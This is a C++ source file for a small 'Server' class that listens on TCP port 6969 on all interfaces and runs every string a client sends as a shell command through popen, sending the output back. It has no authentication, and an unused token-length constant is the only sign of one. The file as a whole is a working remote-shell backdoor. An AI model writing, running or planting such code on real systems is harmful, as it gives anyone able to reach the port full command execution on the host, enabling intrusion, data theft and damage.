#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <csignal>
#include <random>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <algorithm>
#include <cstring>
 
#define TOKEN_LENGTH 256
 
using namespace std;
 
class Server {
    int PORT;
    int server_socket;
    int client_socket;
    struct sockaddr_in address;
    int address_length;
    string current_directory;
 
public:
    Server(int port = 6969) : PORT(port), current_directory(get_current_directory()) {
        create_socket();
        setup_address();
        bind_socket();
        listen_for_connections();
        register_signal_handler();
    }
 
    ~Server() {
        close(server_socket);
    }
 
    void run() {
        while (true) {
            accept_connection();
            handle_client();
        }
    }
 
private:
    void create_socket() {
        if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
            perror("[ERROR] : Socket creation failed");
            exit(EXIT_FAILURE);
        }
        cout << "[LOG] : Socket created successfully.\n";
    }
 
    void setup_address() {
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(PORT);
        address_length = sizeof(address);
    }
 
    void bind_socket() {
        if (bind(server_socket, (struct sockaddr *)&address, sizeof(address)) < 0) {
            perror("[ERROR] : Bind failed");
            exit(EXIT_FAILURE);
        }
        cout << "[LOG] : Bind successful.\n";
    }
 
    void listen_for_connections() {
        if (listen(server_socket, 3) < 0) {
            perror("[ERROR] : Listen failed");
            exit(EXIT_FAILURE);
        }
        cout << "[LOG] : Listening for connections (Max queue: 3)\n";
    }
 
    void accept_connection() {
        if ((client_socket = accept(server_socket, (struct sockaddr *)&address, (socklen_t*)&address_length)) < 0) {
            perror("[ERROR] : Accept failed");
            exit(EXIT_FAILURE);
        }
        cout << "[LOG] : Connection accepted from client.\n";
    }
 
    void handle_client() {
        while (true) {
            string command = receive_message();
            if (command == "exit") {
                break;
            }
            execute_command(command);
        }
    }
 
    void execute_command(const string& command) {
        flush_socket_buffer(client_socket);
        string output;
        if (command.substr(0, 3) == "cd ") {
            change_directory(command.substr(3));
            output = "";
        } else {
            output = run_shell_command(command);
        }
        send_message(output);
    }
 
    void flush_socket_buffer(int socket) {
        char buffer[1024];
        int bytes_available = 0;
 
        if (ioctl(socket, FIONREAD, &bytes_available) == -1) {
            perror("[ERROR] : Checking socket buffer failed");
            return;
        }
 
        while (bytes_available > 0) {
            ssize_t bytes_received = recv(socket, buffer, sizeof(buffer), 0);
            if (bytes_received <= 0) {
                break;
            }
            bytes_available -= bytes_received;
        }
    }
 
    string receive_message() {
        char buffer[1024] = {0};
        if (recv(client_socket, buffer, sizeof(buffer), 0) == -1) {
            perror("[ERROR] : Receiving message from client failed");
        }
        return buffer;
    }
 
    void send_message(const string& message) {
        if (send(client_socket, message.c_str(), message.size() + 1, 0) == -1) { // include null terminator
            perror("[ERROR] : Sending message to client failed");
        }
    }
 
    static void signal_handler(int signum) {
        cout << "\nInterrupt signal (" << signum << ") received. Shutting down...\n";
        exit(signum);
    }
 
    void register_signal_handler() {
        signal(SIGINT, signal_handler);
    }
 
    string get_current_directory() {
        char buffer[1024];
        if (getcwd(buffer, sizeof(buffer)) == NULL) {
            perror("[ERROR] : Getting current directory failed");
            exit(EXIT_FAILURE);
        }
        return string(buffer);
    }
 
    void change_directory(const string& path) {
        if (chdir(path.c_str()) != 0) {
            perror("[ERROR] : Changing directory failed");
        } else {
            current_directory = get_current_directory();
        }
    }
 
    string run_shell_command(const string& command) {
        char buffer[1024];
        string output;
        string full_command = "cd " + current_directory + " && " + command;
        FILE* pipe = popen(full_command.c_str(), "r");
        if (!pipe) {
            perror("[ERROR] : Failed to execute shell command");
            return "";
        }
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        pclose(pipe);
        return output;
    }
};
 
int main() {
    Server server(6969);
    server.run();
    return 0;
}
